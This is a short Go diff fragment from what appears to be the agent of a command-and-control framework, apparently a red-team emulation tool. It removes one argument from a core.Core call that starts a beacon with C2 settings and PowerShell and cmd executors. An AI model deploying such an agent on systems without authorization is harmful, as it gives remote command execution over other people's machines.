@@ -18,7 +18,7 @@ var (
 //export VoidFunc
 func VoidFunc() {
 	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
-	core.Core(defaultServer, defaultGroup, defaultSleep, 0, defaultExeName, []string{"psh","cmd"}, c2Config, false)
+	core.Core(defaultServer, defaultGroup, defaultSleep, 0, []string{"psh","cmd"}, c2Config, false)
 }
 
 func main() {}
